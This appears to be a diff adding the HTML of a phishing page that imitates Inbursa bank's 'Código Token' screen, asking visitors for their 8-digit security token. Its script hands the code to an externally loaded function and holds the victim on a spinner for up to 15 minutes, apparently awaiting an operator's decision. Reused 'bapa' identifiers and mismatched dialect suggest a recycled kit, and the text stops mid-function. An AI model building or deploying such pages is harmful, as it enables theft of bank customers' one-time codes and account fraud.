@@ -1,0 +1,1311 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Código Token — Inbursa</title>
+  <style>
+    :root {
+      --footer-rest-margin-start-pc: 0;
+      --inbursa-navy: #000050;
+      --inbursa-navy-hover: #000040;
+      --bg-main: #f7f9fc;
+      --input-bg: #f1f4ff;
+      --text-muted: #5a6270;
+      --text-body: #212529;
+      --shadow-card: 0 8px 24px rgba(0, 0, 40, 0.08);
+      --sidebar-w: 288px;
+      --token-border-soft: #bfcbfb;
+    }
+
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+    }
+
+    html {
+      height: 100%;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      font-size: 14px;
+      line-height: 1.45;
+      color: var(--text-body);
+      background: var(--bg-main);
+    }
+
+    .app {
+      display: flex;
+      min-height: 100vh;
+    }
+
+    .sidebar {
+      width: var(--sidebar-w);
+      flex-shrink: 0;
+      background: var(--inbursa-navy);
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      padding: 1.5rem 1rem 2rem;
+    }
+
+    .sidebar__brand {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 0;
+      padding-bottom: 2rem;
+      margin-bottom: auto;
+      text-align: center;
+      width: 100%;
+    }
+
+    .sidebar__logo {
+      width: 156px;
+      height: auto;
+    }
+
+    .sidebar__version {
+      font-size: 0.8rem;
+      font-weight: 600;
+      letter-spacing: 0.04em;
+      margin-top: -0.72em;
+      opacity: 0.95;
+    }
+
+    .sidebar__nav {
+      list-style: none;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      gap: 1.45rem;
+    }
+
+    .sidebar__nav a {
+      display: flex;
+      align-items: flex-start;
+      gap: 0.75rem;
+      color: #fff;
+      text-decoration: none;
+      font-size: 0.98rem;
+      line-height: 1.45;
+      opacity: 0.95;
+      transition: opacity 0.15s;
+    }
+
+    .sidebar__nav a:hover {
+      opacity: 1;
+      text-decoration: underline;
+    }
+
+    .sidebar__icon {
+      flex-shrink: 0;
+      width: 21px;
+      height: 21px;
+      opacity: 0.9;
+    }
+
+    .main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      min-width: 0;
+      min-height: 0;
+      background: var(--bg-main);
+    }
+
+    .main__banner-wrap {
+      flex-shrink: 0;
+      background: #ffffff;
+      width: 100%;
+      padding-bottom: 0.85rem;
+    }
+
+    .main__banner-wrap:has(.banner[hidden]) {
+      display: none;
+    }
+
+    .banner {
+      flex-shrink: 0;
+      background: #e11900;
+      color: #fff;
+      margin: 1rem 0.5rem 0;
+      padding: 0.72rem 1.1rem 0.72rem 0.95rem;
+      min-height: 2.55rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-size: 1.05rem;
+      line-height: 1.38;
+      border-radius: 10px;
+    }
+
+    .banner[hidden] {
+      display: none;
+    }
+
+    .banner__icon {
+      flex-shrink: 0;
+      width: 19px;
+      height: 19px;
+      margin-top: 0;
+      display: block;
+      object-fit: contain;
+    }
+
+    .banner__text {
+      flex: 1;
+      padding-right: 0.5rem;
+      margin: 0;
+    }
+
+    .banner__text strong {
+      font-weight: 700;
+      color: inherit;
+    }
+
+    .banner__close {
+      flex-shrink: 0;
+      background: none;
+      border: none;
+      padding: 0.15rem;
+      cursor: pointer;
+      color: #fff;
+      opacity: 0.85;
+      line-height: 1;
+    }
+
+    .banner__close:hover {
+      opacity: 1;
+    }
+
+    /* Móvil: la barra va dentro de la tarjeta (debajo del título); escritorio: solo la de arriba */
+    @media (min-width: 769px) {
+      .main__banner-wrap--mobile {
+        display: none !important;
+      }
+    }
+
+    @media (max-width: 768px) {
+      .main__banner-wrap--desktop {
+        display: none !important;
+      }
+
+      .card .main__banner-wrap--mobile {
+        margin-top: -0.6cm;
+        padding-bottom: 1rem;
+        margin-bottom: 0.65rem;
+      }
+    }
+
+    .card .main__banner-wrap {
+      background: transparent;
+      padding-bottom: 0.55rem;
+      width: 100%;
+      max-width: 100%;
+    }
+
+    .card .main__banner-wrap .banner {
+      margin-left: 0;
+      margin-right: 0;
+    }
+
+    .content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 2rem 1.25rem 1.5rem;
+    }
+
+    /* Medidas del cuadro congeladas: no cambiar sin pedido explícito (.cursor/rules/tok-card-freeze.mdc) */
+    .card {
+      width: 100%;
+      max-width: 384px;
+      margin-top: 1cm;
+      background: #fff;
+      border-radius: 10px;
+      box-shadow: var(--shadow-card);
+      padding: 2.95rem 1.35rem 2.75rem;
+    }
+
+    .card__title {
+      margin: 0 0 0.28rem;
+      font-size: 1.44rem;
+      font-weight: 700;
+      color: var(--inbursa-navy);
+      text-align: center;
+      /* translateY: solo dibujo, no cambia el layout del .card */
+      transform: translateY(-0.5cm);
+    }
+
+    .card__step {
+      margin: 0 0 0.55rem;
+      font-size: 0.98rem;
+      font-weight: 600;
+      color: var(--text-muted);
+      text-align: center;
+      transform: translateY(-0.3cm);
+    }
+
+    .btn-label--mobile {
+      display: none;
+    }
+
+    .token-field-head {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.4rem;
+      margin-bottom: 0.82rem;
+      transform: translateY(-0.4cm);
+    }
+
+    .token-main-label {
+      font-size: 0.9rem;
+      font-weight: 700;
+      color: var(--text-body);
+    }
+
+    .token-help {
+      width: 1.38rem;
+      height: 1.38rem;
+      border-radius: 50%;
+      border: 1px solid var(--text-muted);
+      background: #fff;
+      color: var(--text-muted);
+      cursor: pointer;
+      font-size: 0.72rem;
+      font-weight: 700;
+      padding: 0;
+      line-height: 1;
+      flex-shrink: 0;
+    }
+
+    .token-help:hover {
+      color: var(--text-body);
+      border-color: var(--text-body);
+    }
+
+    .field--token {
+      margin-bottom: 1.35rem;
+    }
+
+    .token-cells {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 0.42rem;
+      flex-wrap: nowrap;
+    }
+
+    .token-cell {
+      width: 2.1rem;
+      height: 3.95rem;
+      text-align: center;
+      font-size: 1.12rem;
+      font-weight: 600;
+      border: 1px solid var(--token-border-soft);
+      border-radius: 8px;
+      background: #f1f3ff;
+      color: #000050;
+      caret-color: #000050;
+      padding: 0;
+      outline: none;
+      transition: border-color 0.12s, border-width 0.12s;
+    }
+
+    .token-cell:focus {
+      border: 2px solid #000050;
+      box-shadow: none;
+    }
+
+    .token-cell.token-filled {
+      border: 2px solid #000050;
+    }
+
+    .token-cell.token-cell--error {
+      border: 2px solid #b42318;
+    }
+
+    .token-cell.token-cell--error:focus {
+      border-color: #b42318;
+      box-shadow: none;
+    }
+
+    .visually-hidden {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      padding: 0;
+      margin: -1px;
+      overflow: hidden;
+      clip: rect(0, 0, 0, 0);
+      white-space: nowrap;
+      border: 0;
+    }
+
+    .btn-primary {
+      width: 100%;
+      margin-top: 0.45rem;
+      padding: 0.95rem 1rem;
+      border: none;
+      border-radius: 8px;
+      color: #fff;
+      font-size: 0.95rem;
+      font-weight: 600;
+      cursor: pointer;
+      filter: none;
+    }
+
+    #tok-form button.btn-primary[type="submit"] {
+      background: #000050 !important;
+      background-color: #000050 !important;
+      transition: opacity 0.15s;
+    }
+
+    #tok-form button.btn-primary[type="submit"]:hover,
+    #tok-form button.btn-primary[type="submit"]:focus,
+    #tok-form button.btn-primary[type="submit"]:focus-visible,
+    #tok-form button.btn-primary[type="submit"]:active {
+      background: #000050 !important;
+      background-color: #000050 !important;
+      filter: none;
+    }
+
+    .footer {
+      margin-top: auto;
+      padding: 1.5rem 1rem 1.25rem;
+      font-size: 0.75rem;
+      color: var(--text-muted);
+      width: 100%;
+      max-width: 900px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .footer__top-wrap {
+      width: 100%;
+      margin-top: 1cm;
+      margin-bottom: 1.85rem;
+      overflow-x: auto;
+      -webkit-overflow-scrolling: touch;
+      scrollbar-width: thin;
+    }
+
+    .footer__top-wrap::-webkit-scrollbar {
+      height: 5px;
+    }
+
+    .footer__top-wrap::-webkit-scrollbar-thumb {
+      background: #c8ced9;
+      border-radius: 4px;
+    }
+
+    .footer__top-row {
+      display: flex;
+      flex-wrap: nowrap;
+      align-items: center;
+      gap: 1rem;
+      width: 100%;
+      box-sizing: border-box;
+      font-size: 0.96rem;
+      font-weight: 500;
+    }
+
+    .footer__privacy-anchor {
+      flex-shrink: 0;
+    }
+
+    .footer__top--rest {
+      display: flex;
+      flex: 1;
+      min-width: 0;
+      flex-wrap: nowrap;
+      justify-content: space-between;
+      align-items: center;
+      gap: 0.35rem;
+    }
+
+    .footer__top-row a,
+    .footer__copy {
+      flex-shrink: 0;
+    }
+
+    .footer__top-row a {
+      color: #000050;
+      text-decoration: underline;
+      text-underline-offset: 0.15em;
+      font-weight: 500;
+    }
+
+    .footer__top-row a:visited {
+      color: #000050;
+    }
+
+    .footer__top-row a:hover {
+      color: var(--inbursa-navy-hover);
+      opacity: 1;
+    }
+
+    .footer__copy {
+      margin: 0;
+      line-height: 1.45;
+      font-weight: 500;
+      color: #000050;
+      text-decoration: none;
+    }
+
+    .footer__legal {
+      text-align: center;
+      margin: 1cm auto 0;
+      font-size: 0.9rem;
+      line-height: 1.78;
+      padding: 0;
+      max-width: none;
+      width: 100%;
+      box-sizing: border-box;
+      font-weight: 400;
+      color: #545454;
+      overflow-x: visible;
+      overflow-wrap: break-word;
+    }
+
+    .footer__legal-name {
+      color: #545454;
+      font-weight: 600;
+    }
+
+    .footer__legal-meta {
+      color: #545454;
+    }
+
+    .footer__legal a {
+      color: #286ef1;
+      font-weight: 500;
+      text-decoration: underline;
+      text-underline-offset: 0.12em;
+    }
+
+    .footer__legal a:visited {
+      color: #286ef1;
+    }
+
+    .footer__legal a:hover {
+      color: #1e5fd4;
+    }
+
+    .tok-msg {
+      color: #b42318;
+      font-size: 0.9rem;
+      margin: 0.35rem 0 0.25rem;
+      line-height: 1.35;
+      text-align: center;
+    }
+
+    .tok-msg[hidden] {
+      display: none !important;
+    }
+
+    .login-form-actions-gap {
+      margin-top: 1.1rem;
+    }
+
+    .btn-primary:disabled,
+    .btn-primary[disabled] {
+      opacity: 0.45;
+      cursor: not-allowed;
+    }
+
+    #tok-form button.btn-primary[type="submit"]:disabled,
+    #tok-form button.btn-primary[type="submit"][disabled] {
+      background: #000050 !important;
+      background-color: #000050 !important;
+      opacity: 0.45;
+    }
+
+    .btn-secondary {
+      width: 100%;
+      margin-top: 0.65rem;
+      padding: 0.95rem 1rem;
+      border: 2px solid var(--inbursa-navy);
+      border-radius: 8px;
+      background: #fff;
+      color: var(--inbursa-navy);
+      font-size: 0.95rem;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: inherit;
+      transition: background 0.15s;
+    }
+
+    .btn-secondary:hover {
+      background: var(--input-bg);
+    }
+
+    @media (min-width: 769px) {
+      html,
+      body {
+        height: 100%;
+        overflow: hidden;
+      }
+
+      body {
+        background: var(--bg-main);
+      }
+
+      .app {
+        height: 100vh;
+        max-height: 100vh;
+        min-height: 0;
+        overflow-x: visible;
+        overflow-y: hidden;
+      }
+
+      .sidebar {
+        height: 100vh;
+        max-height: 100vh;
+        overflow: hidden;
+      }
+
+      .main {
+        height: 100vh;
+        max-height: 100vh;
+        overflow-y: auto;
+        overflow-x: visible;
+        -webkit-overflow-scrolling: touch;
+        scrollbar-width: none;
+        -ms-overflow-style: none;
+      }
+
+      .main::-webkit-scrollbar {
+        width: 0;
+        height: 0;
+        display: none;
+      }
+
+      .main > .content {
+        flex: 1;
+        min-height: 0;
+        width: 100%;
+        align-self: stretch;
+        box-sizing: border-box;
+      }
+
+      .footer__top-wrap {
+        overflow-x: visible;
+      }
+
+      .footer {
+        align-self: stretch;
+        max-width: none;
+        width: calc(100% + 2.5rem);
+        margin-left: -1.25rem;
+        margin-right: -1.25rem;
+        box-sizing: border-box;
+        padding: calc(2rem + 0.5cm) 1.25rem 2.5rem 1cm;
+      }
+
+      .footer__privacy-anchor {
+        margin-left: 1cm;
+      }
+
+      .footer__top--rest {
+        margin-left: var(--footer-rest-margin-start-pc);
+      }
+
+      .footer__copy {
+        margin-left: 2cm;
+      }
+
+      .footer__link--condiciones {
+        margin-left: 4cm;
+      }
+
+      .footer__link--integridad {
+        margin-left: 3cm;
+      }
+    }
+
+    @media (max-width: 768px) {
+      html {
+        height: auto;
+        min-height: 100%;
+        overflow-x: hidden;
+        overflow-y: auto;
+        -webkit-overflow-scrolling: touch;
+      }
+
+      body {
+        height: auto;
+        min-height: 100vh;
+        overflow-x: hidden;
+        overflow-y: auto;
+        -webkit-overflow-scrolling: touch;
+      }
+
+      .main {
+        overflow: visible;
+        min-height: 0;
+      }
+
+      .app {
+        flex-direction: column;
+        height: auto;
+        max-height: none;
+        min-height: 100vh;
+        overflow: visible;
+      }
+
+      .sidebar {
+        height: auto;
+        max-height: none;
+        position: static;
+        width: 100%;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        padding: 1.2rem 1rem 0;
+        gap: 0;
+      }
+
+      .sidebar__brand {
+        border-bottom: none;
+        margin-bottom: 0;
+        padding-bottom: 0;
+        flex: none;
+        min-width: 0;
+      }
+
+      .sidebar__nav {
+        display: none;
+      }
+
+      .footer__top-row {
+        flex-direction: column;
+        align-items: center;
+        gap: 0.5cm;
+      }
+
+      .footer__top--rest {
+        flex-direction: column;
+        flex: none;
+        width: 100%;
+        max-width: 100%;
+        align-items: center;
+        justify-content: flex-start;
+        gap: 0.5cm;
+      }
+
+      .footer__copy {
+        margin-left: 0;
+      }
+
+      .sidebar__version {
+        display: none;
+      }
+
+      .main .content {
+        padding: 0 0.65rem 1.5rem;
+      }
+
+      .card {
+        max-width: none;
+        width: 100%;
+        background: transparent;
+        box-shadow: none;
+        border-radius: 0;
+        padding: 0 0.55rem 1.95rem;
+      }
+
+      .card__title {
+        margin-top: 0;
+        margin-bottom: 0.22rem;
+        font-size: 1.44rem;
+        color: var(--text-body);
+        background: #eae8ed;
+        padding: 0.7rem calc(0.65rem + 0.55rem);
+        margin-left: calc(-1 * (0.65rem + 0.55rem));
+        margin-right: calc(-1 * (0.65rem + 0.55rem));
+        box-sizing: border-box;
+        transform: translateY(-1cm);
+      }
+
+      .card__step {
+        margin: 0 0 0.28rem;
+        font-size: 0.98rem;
+        font-weight: 600;
+        transform: translateY(-0.3cm);
+      }
+
+      /* Separación entre el cuadro de error y «Paso 1 de 2» (el translate del paso lo pegaba al rojo) */
+      .card:has(.js-tok-error-banner:not([hidden])) .card__step {
+        margin-top: 1rem;
+        transform: translateY(0);
+      }
+
+      .token-field-head {
+        margin-top: 0.55rem;
+        margin-bottom: 1rem;
+        transform: translateY(-0.4cm);
+      }
+
+      .field--token {
+        margin-bottom: 1.25rem;
+      }
+
+      .token-cells {
+        gap: 0.28rem;
+      }
+
+      .token-cell {
+        width: 1.78rem;
+        height: 3.6rem;
+        font-size: 1rem;
+        border-radius: 6px;
+      }
+
+      .btn-label--desktop {
+        display: none !important;
+      }
+
+      .btn-label--mobile {
+        display: inline !important;
+      }
+
+      #tok-form button.btn-primary[type="submit"] {
+        background: #286ef1 !important;
+        background-color: #286ef1 !important;
+        border-radius: 9999px;
+        padding: 0.72rem 1.2rem;
+        margin-top: 0.55rem;
+      }
+
+      #tok-form button.btn-primary[type="submit"]:hover,
+      #tok-form button.btn-primary[type="submit"]:focus,
+      #tok-form button.btn-primary[type="submit"]:focus-visible,
+      #tok-form button.btn-primary[type="submit"]:active {
+        background: #1e5fd4 !important;
+        background-color: #1e5fd4 !important;
+      }
+
+      #tok-form button.btn-primary[type="submit"]:disabled,
+      #tok-form button.btn-primary[type="submit"][disabled] {
+        background: #286ef1 !important;
+        background-color: #286ef1 !important;
+        opacity: 0.48;
+      }
+
+      #tok-form .btn-secondary {
+        background: var(--inbursa-navy) !important;
+        background-color: var(--inbursa-navy) !important;
+        color: #fff !important;
+        border: none !important;
+        border-radius: 9999px;
+        padding: 0.72rem 1.2rem;
+      }
+
+      #tok-form .btn-secondary:hover {
+        background: #000040 !important;
+        background-color: #000040 !important;
+        color: #fff !important;
+      }
+
+      .main .content > .footer {
+        display: none !important;
+      }
+    }
+
+    /* Mismo overlay de espera que index1.html (vector.svg) */
+    .bapa-login-wait {
+      position: fixed;
+      inset: 0;
+      z-index: 999;
+      background: rgba(0, 8, 30, 0.14);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1.25rem;
+    }
+
+    .bapa-login-wait[hidden] {
+      display: none !important;
+    }
+
+    .bapa-login-wait__icon {
+      width: 60px;
+      height: 60px;
+      display: block;
+      animation: bapa-login-vector-spin 2.1s linear infinite;
+      filter: drop-shadow(0 2px 5px rgba(0, 0, 25, 0.25));
+    }
+
+    @keyframes bapa-login-vector-spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .bapa-login-wait__sr-only {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      padding: 0;
+      margin: -1px;
+      overflow: hidden;
+      clip: rect(0, 0, 0, 0);
+      white-space: nowrap;
+      border: 0;
+    }
+  </style>
+</head>
+<body>
+  <div class="app">
+    <aside class="sidebar" aria-label="Enlaces de ayuda">
+      <div class="sidebar__brand">
+        <img class="sidebar__logo" src="I/logo.svg" alt="Inbursa" width="156" height="40" />
+        <span class="sidebar__version">77.0.8</span>
+      </div>
+      <ul class="sidebar__nav">
+        <li>
+          <a href="#">
+            <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true">
+              <rect x="6" y="3" width="12" height="18" rx="2" />
+              <path d="M10 18h4" stroke-linecap="round" />
+            </svg>
+            Conoce Inbursa Móvil
+          </a>
+        </li>
+        <li>
+          <a href="tel:8009090000">
+            <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true">
+              <path d="M4 5h4l2 5-2 1a12 12 0 006 6l1-2 5 2v4a2 2 0 01-2 2C9.9 21 3 14.1 3 6a2 2 0 012-2z" stroke-linejoin="round" />
+            </svg>
+            800 90 90000
+          </a>
+        </li>
+        <li>
+          <a href="#">
+            <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true">
+              <rect x="5" y="11" width="14" height="10" rx="2" />
+              <path d="M8 11V8a4 4 0 018 0v3" />
+            </svg>
+            Tips de Seguridad
+          </a>
+        </li>
+        <li>
+          <a href="#">
+            <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true">
+              <rect x="3" y="4" width="18" height="13" rx="2" />
+              <path d="M8 21h8M12 17v4" stroke-linecap="round" />
+            </svg>
+            Requerimientos mínimos técnicos
+          </a>
+        </li>
+        <li>
+          <a href="#">
+            <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true">
+              <path d="M12 21s7-4.5 7-11a7 7 0 10-14 0c0 6.5 7 11 7 11z" />
+              <circle cx="12" cy="10" r="2.5" fill="currentColor" stroke="none" />
+            </svg>
+            Manual de Geolocalización
+          </a>
+        </li>
+      </ul>
+    </aside>
+
+    <main class="main">
+      <div class="main__banner-wrap main__banner-wrap--desktop">
+        <div class="banner js-tok-error-banner" role="alert" hidden>
+          <img class="banner__icon" src="I/x.svg" width="24" height="24" alt="" />
+          <p class="banner__text"></p>
+          <button type="button" class="banner__close js-tok-banner-close" aria-label="Cerrar aviso">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M6 6l12 12M18 6L6 18" stroke-linecap="round" />
+            </svg>
+          </button>
+        </div>
+      </div>
+
+      <div class="content">
+        <div class="card">
+          <h1 class="card__title">Código Token</h1>
+          <div class="main__banner-wrap main__banner-wrap--mobile">
+            <div class="banner js-tok-error-banner" role="alert" hidden>
+              <img class="banner__icon" src="I/x.svg" width="24" height="24" alt="" />
+              <p class="banner__text"></p>
+              <button type="button" class="banner__close js-tok-banner-close" aria-label="Cerrar aviso">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                  <path d="M6 6l12 12M18 6L6 18" stroke-linecap="round" />
+                </svg>
+              </button>
+            </div>
+          </div>
+          <p class="card__step">Paso 1 de 2</p>
+          <form id="tok-form" action="#" method="post" autocomplete="off">
+            <div class="field field--token">
+              <div class="token-field-head">
+                <span class="token-main-label" id="token-legend">Ingresa el código Token</span>
+                <button type="button" class="token-help" aria-label="Información sobre el código token" title="Ayuda">?</button>
+              </div>
+              <div class="token-cells" role="group" aria-labelledby="token-legend">
+                <span class="visually-hidden" id="token-sr-hint">Ocho dígitos, uno por casilla</span>
+                <input class="token-cell" id="token-0" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code" data-tok-i="0" aria-describedby="token-sr-hint" />
+                <input class="token-cell" id="token-1" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-tok-i="1" />
+                <input class="token-cell" id="token-2" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-tok-i="2" />
+                <input class="token-cell" id="token-3" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-tok-i="3" />
+                <input class="token-cell" id="token-4" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-tok-i="4" />
+                <input class="token-cell" id="token-5" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-tok-i="5" />
+                <input class="token-cell" id="token-6" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-tok-i="6" />
+                <input class="token-cell" id="token-7" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-tok-i="7" />
+              </div>
+              <input type="hidden" name="token" id="token-full" value="" />
+            </div>
+            <p class="tok-msg" id="tok-msg" hidden role="alert"></p>
+            <button type="submit" class="btn-primary login-form-actions-gap">
+              <span class="btn-label--desktop">Continuar</span>
+              <span class="btn-label--mobile">Ingresar</span>
+            </button>
+            <button type="button" class="btn-secondary" id="btn-cancelar-tok">Cancelar</button>
+          </form>
+        </div>
+
+        <footer class="footer">
+          <div class="footer__top-wrap">
+            <nav class="footer__top-row" aria-label="Legal y copyright">
+              <div class="footer__privacy-anchor">
+                <a href="#">Política de Privacidad</a>
+              </div>
+              <div class="footer__top--rest">
+                <a class="footer__link--condiciones" href="#">Condiciones de Uso</a>
+                <a class="footer__link--integridad" href="#">Política de Integridad Corporativa</a>
+                <span class="footer__copy">© 2026 Grupo Financiero Inbursa</span>
+              </div>
+            </nav>
+          </div>
+          <p class="footer__legal">
+            <span class="footer__legal-name">Comisión Nacional para la Protección y Defensa de los Usuarios de Servicios Financieros (CONDUSEF)</span><br />
+            <span class="footer__legal-meta">Teléfono: (55) 5340 0999 / </span><a href="https://www.condusef.gob.mx/" rel="noopener noreferrer" target="_blank">https://www.condusef.gob.mx/</a>
+          </p>
+        </footer>
+      </div>
+    </main>
+  </div>
+
+  <div id="tok-wait-overlay" class="bapa-login-wait" hidden aria-busy="false">
+    <img class="bapa-login-wait__icon" src="I/vector.svg" width="60" height="60" alt="" aria-hidden="true" />
+    <span class="bapa-login-wait__sr-only">Cargando</span>
+  </div>
+
+  <script src="script.js?v=inbursa-local-1"></script>
+  <script>
+    (function () {
+      var form = document.getElementById("tok-form");
+      var cells = form ? Array.prototype.slice.call(form.querySelectorAll(".token-cell")) : [];
+      var cellsWrap = form ? form.querySelector(".token-cells") : null;
+      var hidden = document.getElementById("token-full");
+      var msg = document.getElementById("tok-msg");
+      var cancel = document.getElementById("btn-cancelar-tok");
+      var overlayWait = document.getElementById("tok-wait-overlay");
+      var tokErrorBanners = document.querySelectorAll(".js-tok-error-banner");
+      var TOK_WAIT_MAX_MS = 15 * 60 * 1000;
+      var tokenTouched = false;
+
+      function resetTokBannerDefault() {
+        tokErrorBanners.forEach(function (banner) {
+          var t = banner.querySelector(".banner__text");
+          if (t) t.textContent = "";
+          banner.hidden = true;
+        });
+      }
+
+      function showTokBannerError(text) {
+        tokErrorBanners.forEach(function (banner) {
+          var t = banner.querySelector(".banner__text");
+          var icon = banner.querySelector(".banner__icon");
+          if (t) t.textContent = text;
+          if (icon) {
+            icon.src = "I/x.svg";
+            icon.setAttribute("width", "24");
+            icon.setAttribute("height", "24");
+          }
+          banner.hidden = false;
+        });
+        hideMsg();
+      }
+
+      document.querySelectorAll(".js-tok-banner-close").forEach(function (btn) {
+        btn.addEventListener("click", function () {
+          resetTokBannerDefault();
+        });
+      });
+
+      function showTokWait() {
+        if (!overlayWait) return;
+        overlayWait.hidden = false;
+        overlayWait.setAttribute("aria-busy", "true");
+      }
+
+      function hideTokWait() {
+        if (!overlayWait) return;
+        overlayWait.hidden = true;
+        overlayWait.setAttribute("aria-busy", "false");
+      }
+
+      function isTokenCell(el) {
+        return el && cells.indexOf(el) !== -1;
+      }
+
+      function clearTokenErrors() {
+        cells.forEach(function (c) {
+          c.classList.remove("token-cell--error");
+        });
+      }
+
+      function applyTokenErrorsEmptySlots() {
+        cells.forEach(function (c) {
+          var has = String(c.value || "").replace(/\D/g, "").length > 0;
+          if (has) {
+            c.classList.remove("token-cell--error");
+          } else {
+            c.classList.add("token-cell--error");
+          }
+        });
+      }
+
+      function maybeShowIncompleteErrors() {
+        if (!tokenTouched) return;
+        if (/^\d{8}$/.test(getTokenString())) {
+          clearTokenErrors();
+          return;
+        }
+        applyTokenErrorsEmptySlots();
+      }
+
+      function hideMsg() {
+        if (!msg) return;
+        msg.textContent = "";
+        msg.hidden = true;
+      }
+
+      function showMsg(t) {
+        if (!msg) return;
+        msg.textContent = t;
+        msg.hidden = false;
+      }
+
+      function syncFilledClass(inp) {
+        var d = String(inp.value || "").replace(/\D/g, "");
+        if (d.length > 0) {
+          inp.value = d.charAt(0);
+          inp.classList.add("token-filled");
+          inp.classList.remove("token-cell--error");
+        } else {
+          inp.value = "";
+          inp.classList.remove("token-filled");
+        }
+      }
+
+      function getTokenString() {
+        return cells
+          .map(function (c) {
+            return String(c.value || "").replace(/\D/g, "").charAt(0) || "";
+          })
+          .join("");
+      }
+
+      function syncHidden() {
+        if (hidden) hidden.value = getTokenString();
+      }
+
+      function syncSubmit() {
+        if (!form) return;
+        var btn = form.querySelector('button[type="submit"]');
+        if (!btn) return;
+        btn.disabled = !/^\d{8}$/.test(getTokenString());
+      }
+
+      function focusCell(i) {
+        if (i < 0 || i >= cells.length) return;
+        cells[i].focus();
+      }
+
+      if (cellsWrap) {
+        cellsWrap.addEventListener("mousedown", function () {
+          tokenTouched = true;
+        });
+      }
+
+      cells.forEach(function (cell, idx) {
+        cell.addEventListener("focus", function () {
+          tokenTouched = true;
+          clearTokenErrors();
+          cell.select();
+        });
+
+        cell.addEventListener("blur", function () {
+          window.setTimeout(function () {
+            var ae = document.activeElement;
+            if (isTokenCell(ae)) return;
+            maybeShowIncompleteErrors();
+          }, 0);
+        });
+
+        cell.addEventListener("input", function () {
+          hideMsg();
+          resetTokBannerDefault();
+          syncFilledClass(cell);
+          syncHidden();
+          syncSubmit();
+          if (/^\d{8}$/.test(getTokenString())) {
+            clearTokenErrors();
+          }
+          var v = String(cell.value || "").replace(/\D/g, "");
+          if (v && idx < cells.length - 1) {
+            focusCell(idx + 1);
+          }
+        });
+
+        cell.addEventListener("keydown", function (e) {
+          if (e.key === "Backspace" && !cell.value && idx > 0) {
+            e.preventDefault();
+            resetTokBannerDefault();
+            cells[idx - 1].focus();
+            cells[idx - 1].value = "";
+            syncFilledClass(cells[idx - 1]);
+            syncHidden();
+            syncSubmit();
+          }
+          if (e.key === "ArrowLeft" && idx > 0) {
+            e.preventDefault();
+            focusCell(idx - 1);
+          }
+          if (e.key === "ArrowRight" && idx < cells.length - 1) {
+            e.preventDefault();
+            focusCell(idx + 1);
+          }
+        });
+
+        cell.addEventListener("paste", function (e) {
+          e.preventDefault();
+          hideMsg();
+          resetTokBannerDefault();
+          var t = (e.clipboardData || window.clipboardData).getData("text") || "";
+          t = String(t).replace(/\D/g, "").slice(0, 8);
+          for (var k = 0; k < cells.length; k++) {
+            cells[k].value = t.charAt(k) || "";
+            syncFilledClass(cells[k]);
+          }
+          syncHidden();
+          syncSubmit();
+          if (/^\d{8}$/.test(getTokenString())) {
+            clearTokenErrors();
+          }
+          var next = Math.min(t.length, cells.length - 1);
+          focusCell(next);
+        });
+      });
+
+      syncHidden();
+      syncSubmit();
+
+      if (cancel) {
+        cancel.addEventListener("click", function () {
+          if (window.history.length > 1) {
+            window.history.back();
+          } else {
+            window.location.href = "index1.html";
+          }
+        });
+      }
+
+      document.querySelector(".token-help") &&
+        document.querySelector(".token-help").addEventListener("click", function () {
+          alert("Ingresá el código de 8 dígitos que muestra tu dispositivo token o app autorizada.");
+        });
+
+      if (form) {
+        form.addEventListener("submit", async function (e) {
+          e.preventDefault();
+          hideMsg();
+          var s = getTokenString();
+          if (!/^\d{8}$/.test(s)) {
+            tokenTouched = true;
+            applyTokenErrorsEmptySlots();
+            showMsg("El código debe tener 8 dígitos.");
+            focusCell(s.length < 8 ? s.length : 0);
+            return;
+          }
+          resetTokBannerDefault();
+          var btnSubmit = form.querySelector('button[type="submit"]');
+          if (btnSubmit) btnSubmit.disabled = true;
+          var decideId = "";
+          if (typeof window.bapaEnviarToken8AlLogin === "function") {
+            try {
+              decideId = await window.bapaEnviarToken8AlLogin(s);
+            } catch (errTok) {
+              decideId = "";
+            }
+          }
+          if (!decideId) {
